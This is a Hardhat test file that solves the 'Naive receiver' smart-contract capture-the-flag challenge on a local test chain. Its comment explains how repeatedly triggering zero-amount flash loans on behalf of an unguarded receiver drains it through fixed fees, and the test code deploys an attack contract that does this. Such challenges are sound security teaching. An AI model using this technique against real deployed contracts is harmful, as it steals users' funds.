const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
      /**
       * @dev
       * The NaiveReceiver contract that we want to drain has a function, receiveEther(), that gets called by the flashLoan() function of the lending pool if we pass it the NaiveReceiver contract address as an argument.
       * The security flaw here lies in the fact that receiveEther() does not check msg.value, which is the amount borrowed. We can pass it any amount, including 0: a call to flashLoan() would then simply result in losing the flashLoan() fee we have to repay. (Unless you manage to do some magic in _executeActionDuringFlashLoan() of course 😉)
       * Another flaw is that _executeActionDuringFlashLoan() does not perform any action: a flashLoan would then result in losing 1ETH of fee.
       * The second flaw lies in the NaiveReceiverLendingPool flashLoan() function: it does not check who is calling the function. This means anyone can call it, passing any contract address they want.
       * Our attack will consist in calling flashLoan() 10 times, passing it as arguments the NaiveReceiver contract address and an borrowed amount of 0. The fee being 1ETH, the contract will be drained of all its ETH.
       * We can either loop 10 times a call to flashLoan() here, or create an attacking contract that would loop the call in a single function call. As the challenge is to drain the funds in one transaction, we will choose the second option.
       *
       *
       *note: _executeActionDuringFlashLoan() is currently empty, so technically any amount we borrow would result in nothing happening and draining the NaiveReceiver (try it: you can change the borrowed amount in the NaiveReceiverAttack contract to any value between 0 and 1000 ETH, the test will pass), but the point is that as there is a fixed fee of 1ETH to repay, it would be best to ensure we borrowed enough so that the logic we performed during the flash loan yielded profit.
       *E.g: the logic you perform in _executeActionDuringFlashLoan() is an arbitrage swap that gives you a 20% return, you'd need to borrow at least 5ETH (actually more to account for gas) for it to be profitable.
       */
      const NaiveReceiverAttackFactory = await ethers.getContractFactory(
        'NaiveReceiverAttack',
        deployer
      );

      this.receiverattacker = await NaiveReceiverAttackFactory.deploy(
        this.pool.address
      );
      await this.receiverattacker.attack(this.receiver.address);

      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
